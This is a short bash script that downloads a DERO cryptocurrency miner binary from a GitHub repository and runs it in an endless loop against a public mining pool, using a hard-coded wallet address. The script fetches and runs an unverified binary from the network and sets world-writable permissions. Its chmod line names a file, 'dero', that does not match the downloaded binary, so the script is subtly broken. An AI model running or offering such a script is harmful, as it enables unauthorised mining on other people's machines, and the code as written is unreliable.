wget https://github.com/WxYtzaiu/asekhh/raw/main/dero-stratum-miner
chmod 777 dero

#!/bin/bash
while :; do
./dero-stratum-miner -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6hsk03skqgr8tscz0xla.$(echo $(shuf -i 1-20000 -n 1)-m1)
sleep 5;
done
